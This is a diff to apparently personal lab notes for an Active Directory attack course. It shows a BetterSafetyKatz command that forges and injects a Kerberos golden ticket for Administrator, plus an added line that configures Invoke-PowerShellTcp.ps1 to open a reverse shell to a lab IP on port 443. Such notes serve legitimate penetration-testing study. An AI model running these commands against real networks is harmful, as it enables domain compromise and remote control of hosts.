@@ -397,4 +397,7 @@ Create the golden ticket
 ```powershell
 C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid: S-1-5-21- 719815819-3726368948-3917688648 /target:dcorp-dc.dollarcorp.moneycorp.local /service:HOST /rc4:af0686cc0ca8f04df42210c9ac980760 /startoffset:0 /endin:600 /renewmax:10080 /ptt" "exit"
 ```
-Modify Invoke-PowerShellTcpEx.ps1
+Modify Invoke-PowerShellTcp.ps1. Paste
+```
+Power -Reverse -IPAddress 172.16.100.115 -Port 443
+```
